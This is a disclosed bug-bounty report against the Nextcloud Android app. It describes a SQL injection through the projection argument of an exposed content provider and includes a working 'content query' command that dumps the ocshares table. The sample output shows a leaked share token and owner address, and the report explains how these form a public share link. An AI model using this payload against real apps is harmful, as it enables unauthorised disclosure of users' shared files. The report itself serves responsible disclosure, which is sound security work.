# SQLi allow query restriction bypass on exposed FileContentProvider

## Report Details
- **Report ID**: 518669
- **URL**: https://hackerone.com/reports/518669
- **State**: Closed
- **Severity**: low
- **Submitted**: 2019-03-29T12:20:48.281Z
- **Disclosed**: 2019-07-29T08:35:04.189Z

## Reporter
- **Username**: doragon
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
FileContentProvider is an exposed provider 

As per its definition on https://github.com/nextcloud/android/blob/master/src/main/java/com/owncloud/android/providers/FileContentProvider.java, limited set of data shall be exposed as per
```
 @l444
        switch (mUriMatcher.match(uri)) {
            case ROOT_DIRECTORY:
            case SINGLE_FILE:
            case DIRECTORY:
                break;

            default:
                if (isCallerNotAllowed(uri)) {
                    return null;
                }
}
```
However, the projection map restriction is only applied to ROOT_DIRECTORY @l577
```
 if (mUriMatcher.match(uri) == ROOT_DIRECTORY && projectionArray != null) {
```
because of this, it is possible to bypass the restrictions at @l444 by crafting for instance the  intent

```
 content query --uri content://org.nextcloud/file --projection "* from ocshares --"                                              

```

which results in 

```                                                                        
Row: 0 _id=1, file_source=71580, item_source=71580, share_type=3, shate_with=, path=/Nextcloud.mp4, permissions=1, shared_date=1544792454, expiration_date=0, token=rkNCkcYcbGEBDQN, shared_with_display_name=, is_directory=0, user_id=-1, id_remote_shared=9, owner_share=julien_contacts@cloud.local.yourosoft.com, is_password_protected=0, note=, hide_download=0
```

as per disclosed data on owner_share and token, one can easily forge the query https://cloud.local.yourosoft.com/index.php/s/rkNCkcYcbGEBDQN

any table defined in filelist.db is subject to full disclosure

## Impact

any table defined in filelist.db is subject to full disclosure

## Attachments
No attachments
